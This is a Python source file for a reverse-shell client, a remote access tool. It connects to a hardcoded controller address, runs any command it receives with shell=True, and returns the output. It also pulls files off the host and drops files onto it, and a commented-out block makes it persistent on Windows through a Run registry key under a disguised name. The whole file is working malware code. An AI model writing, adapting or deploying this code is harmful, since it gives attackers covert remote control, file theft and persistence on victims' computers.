import subprocess, shutil, sys, os, socket
from time import sleep as sona

IP = "127.0.0.1"
PORT = 8999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # build an ipv4 TCP connection


def send_to_server(data):
    client.sendall(data.encode())


# a function that receive data from server.
def receive_from_server():
    data = ''
    while True:
        try:
            data = data + client.recv(1024).decode().rstrip()
            return data
        except ValueError:
            continue


# when the server wants to download the file from client.
def upload_to_server(file_path):
    f = open(file_path, 'rb')
    client.send(f.read())


# when the server wants to upload the file on client this handle it.
def download_from_server(file_path):
    split_path = file_path.split("/")[-1]
    with open(split_path, "wb") as file:
        client.settimeout(1)
        chunk = client.recv(1024)
        while chunk:
            file.write(chunk)
            try:
                chunk = client.recv(1024)
            except socket.timeout as e:
                break
        client.settimeout(None)


# creating a function to make connection with server
def connect_with_server():
    while True:
        sona(10)
        try:
            client.connect((IP, PORT))
            shell()
            client.close()
            break
        except:
            connect_with_server()


# receive commands from server and execute it and send output.
def shell():
    while True:
        command = receive_from_server()
        if command == "quit":
            break
        elif command == "back":
            pass
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:8] == "download":
            if os.path.isfile(command[9:]):
                upload_to_server(command[9:])
            else:
                send_to_server("Please!, send a regular file path.")
        elif command[:6] == "upload":
            download_from_server(command[7:])
        elif command[:7] == "sendall":
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            send_to_server(result)

# persistancy code only work on windows when it convert to exe
# location = os.environ["appdata"] + "\\dependencies.exe"  # path: appdata/roaming
# if not os.path.exists(location):
#     shutil.copyfile(sys.executable, location)  # copying the executable to roaming folder.
#     subprocess.call(f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v dependencies /t REG_SZ /d {location} ", shell=True)  # adding executable to reg and making it p3rs1st4ace


connect_with_server()
